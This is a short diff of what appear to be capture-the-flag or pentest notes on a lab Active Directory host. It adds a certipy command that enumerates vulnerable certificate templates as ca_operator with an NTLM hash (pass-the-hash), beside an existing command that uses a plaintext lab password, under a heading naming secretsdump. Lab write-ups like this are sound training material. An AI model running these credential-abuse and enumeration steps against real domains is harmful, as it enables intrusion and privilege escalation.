@@ -157,7 +157,7 @@ enumerates AD CS for vuln certs
 
 certipy find -vulnerable -u judith.mader -p judith09 -dc-ip 10.10.11.41 -stdout
 
-
+certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
 
 
 SECRETSDUMP.PY
